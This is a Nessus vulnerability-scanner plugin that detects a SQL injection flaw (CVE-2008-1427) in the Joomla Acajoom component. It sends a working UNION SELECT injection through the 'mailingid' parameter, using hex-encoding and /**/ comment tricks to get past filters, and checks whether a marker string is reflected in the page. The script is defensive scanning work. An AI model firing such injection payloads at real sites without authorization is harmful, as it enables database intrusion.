#
# (C) Tenable Network Security, Inc.
#

if ( NASL_LEVEL < 3000 ) exit(0);


include("compat.inc");

if (description)
{
  script_id(31626);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2008-1427");
  script_bugtraq_id(28305);
  script_xref(name:"milw0rm", value:"5273");
  script_xref(name:"OSVDB", value:"43347");
  script_xref(name:"Secunia", value:"29429");

  script_name(english:"Acajoom Component mailingid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a mailing view");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of the Acajoom component for Joomla installed on the
remote host fails to sanitize user-supplied input to the 'mailingid'
parameter before using it in a database query in the function
'getOneMailing()' in 'classes/class.mailing.php'.  Regardless of PHP's
'magic_quotes_gpc' setting, an attacker may be able to exploit this
issue to manipulate database queries, leading to disclosure of
sensitive information, execution of arbitrary code, or attacks against
the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5015c29e" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Acajoom 1.6.x or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to manipulate a mailing view.
  magic = string(SCRIPT_NAME, "-", unixtime());
  exploit = "concat(";
  for (i=0; i<strlen(magic); i++)
    exploit += hex(ord(magic[i])) + ",";
  exploit[strlen(exploit)-1] = ")";
  exploit = string("99999 UNION SELECT 1,1,1,1,", exploit, ",1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--");

  r = http_send_recv3(method:"GET", port: port,
    item:string(dir, "/index.php?", "option=com_acajoom&",
      "act=mailing&", "task=view&",
      "mailingid=", str_replace(find:" ", replace:"/**/", string:exploit) ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we could manipulate the view.
  if (string('<div class="componentheading">', magic, '</div') >< res)
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
